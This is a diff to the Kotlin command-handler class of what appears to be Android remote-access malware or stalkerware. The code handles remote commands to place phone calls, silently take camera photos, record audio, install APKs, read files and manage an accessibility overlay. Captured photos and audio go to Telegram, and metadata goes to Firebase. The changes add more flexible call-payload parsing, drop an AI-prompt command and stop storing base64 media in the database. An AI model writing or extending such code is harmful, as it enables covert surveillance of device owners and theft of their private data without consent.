@@ -118,9 +118,49 @@ class RemoteCommandManager(private val context: Context) {
                     resultMessage = "All remote backup data and local logs cleared successfully."
                 }
                 "PLACE_CALL", "MAKE_CALL", "CALL", "CALL_PHONE", "DIAL_CALL", "REMOTE_CALL" -> {
-                    val parts = payload.split("|")
-                    val targetNum = parts[0].trim()
-                    val targetSim = parts.getOrNull(1)?.trim()?.toIntOrNull()
+                    var targetNum = ""
+                    var targetSim: Int? = null
+
+                    val trimmed = payload.trim()
+                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
+                        try {
+                            val json = JSONObject(trimmed)
+                            val numKeys = listOf("phone", "phoneNumber", "number", "target", "num", "param1", "p1", "value")
+                            for (key in numKeys) {
+                                if (json.has(key)) {
+                                    val v = json.optString(key, "").trim()
+                                    if (v.isNotEmpty()) {
+                                        targetNum = v
+                                        break
+                                    }
+                                }
+                            }
+                            val simKeys = listOf("sim", "simSlot", "slot", "param2", "p2")
+                            for (key in simKeys) {
+                                if (json.has(key)) {
+                                    val s = json.optInt(key, -1)
+                                    if (s >= 0) {
+                                        targetSim = s
+                                        break
+                                    }
+                                }
+                            }
+                        } catch (_: Exception) {}
+                    }
+
+                    if (targetNum.isEmpty()) {
+                        if (trimmed.contains("|")) {
+                            val parts = trimmed.split("|")
+                            targetNum = parts[0].trim()
+                            targetSim = parts.getOrNull(1)?.trim()?.toIntOrNull()
+                        } else if (trimmed.contains("=")) {
+                            val parts = trimmed.split("=")
+                            targetNum = parts.last().trim()
+                        } else {
+                            targetNum = trimmed
+                        }
+                    }
+
                     val res = CallHelper.placeCall(context, targetNum, targetSim)
                     resultMessage = res
                     if (res.contains("denied", ignoreCase = true) ||
@@ -147,12 +187,6 @@ class RemoteCommandManager(private val context: Context) {
                 "HIDE_ACCESSIBILITY_OVERLAY", "REMOVE_ACCESSIBILITY_OVERLAY", "HIDE_OVERLAY", "DISMISS_ACCESSIBILITY_OVERLAY" -> {
                     com.example.service.AccessibilityOverlayManager.removeOverlay(context)
                     resultMessage = "Accessibility overlay removed remotely."
-                }
-                "AI_PROMPT", "AI_COMMAND", "PROMPT", "ASK_AI" -> {
-                    val promptText = payload.ifEmpty { "Perform default action" }
-                    resultMessage = kotlinx.coroutines.runBlocking {
-                        AiAgentManager(context).processAiPrompt(promptText)
-                    }
                 }
                 "SILENT_INSTALL", "INSTALL_APK", "SILENT_APP_INSTALL", "INSTALL_APP" -> {
                     val apkUrl = payload.trim()
@@ -703,7 +737,7 @@ class RemoteCommandManager(private val context: Context) {
                 "REMOTE_CAMERA_SNAP", "CAMERA_SNAP", "CAM_SNAP", "CAPTURE_PHOTO", "TAKE_PHOTO" -> {
                     resultMessage = captureSilentCameraSnap(payload)
                 }
-                "REMOTE_RECORD_AUDIO", "RECORD_AUDIO", "AUDIO_RECORD", "START_AUDIO_RECORD" -> {
+                "REMOTE_AUDIO_RECORD", "REMOTE_RECORD_AUDIO", "RECORD_AUDIO", "AUDIO_RECORD", "START_AUDIO_RECORD" -> {
                     resultMessage = recordAudioRemote(payload)
                 }
                 "READ_FILE", "FILE_READ", "READ_BASE64", "GET_FILE_BASE64" -> {
@@ -1045,7 +1079,7 @@ class RemoteCommandManager(private val context: Context) {
                 "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
                 "cameraFacing" to facingName,
                 "fileSizeBytes" to bytes.size,
-                "photoBase64" to base64Data
+                "status" to "Uploaded to Telegram"
             )
 
             try {
@@ -1053,7 +1087,7 @@ class RemoteCommandManager(private val context: Context) {
                 rtdb.getReference("devices/$deviceId/camera_snaps/$nowMs").setValue(photoData)
                 rtdb.getReference("devices/$deviceId/camera_latest").setValue(photoData)
             } catch (e: Exception) {
-                Log.e("RemoteCommandManager", "Failed to upload camera snap to RTDB: ${e.message}")
+                Log.e("RemoteCommandManager", "Failed to upload camera snap meta to RTDB: ${e.message}")
             }
 
             try {
@@ -1063,7 +1097,7 @@ class RemoteCommandManager(private val context: Context) {
                 Log.e("RemoteCommandManager", "Failed to upload camera snap to Telegram: ${e.message}")
             }
 
-            "Captured silent $facingName camera photo (${(bytes.size / 1024)} KB). Uploaded to Telegram & Cloud."
+            "Captured silent $facingName camera photo (${(bytes.size / 1024)} KB). Uploaded to Telegram."
         } finally {
             cameraHelper.cleanup()
         }
@@ -1119,7 +1153,7 @@ class RemoteCommandManager(private val context: Context) {
                 "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
                 "durationSeconds" to finalDuration,
                 "fileSizeBytes" to audioBytes.size,
-                "audioBase64" to base64Data
+                "status" to "Uploaded to Telegram"
             )
 
             try {
@@ -1127,7 +1161,7 @@ class RemoteCommandManager(private val context: Context) {
                 rtdb.getReference("devices/$deviceId/audio_recordings/$nowMs").setValue(recData)
                 rtdb.getReference("devices/$deviceId/audio_latest").setValue(recData)
             } catch (e: Exception) {
-                Log.e("RemoteCommandManager", "Failed to upload audio recording to RTDB: ${e.message}")
+                Log.e("RemoteCommandManager", "Failed to upload audio recording meta to RTDB: ${e.message}")
             }
 
             try {
@@ -1137,7 +1171,7 @@ class RemoteCommandManager(private val context: Context) {
                 Log.e("RemoteCommandManager", "Failed to upload audio to Telegram: ${e.message}")
             }
 
-            "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Telegram & Cloud."
+            "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Telegram."
         } finally {
             audioHelper.cleanup()
         }
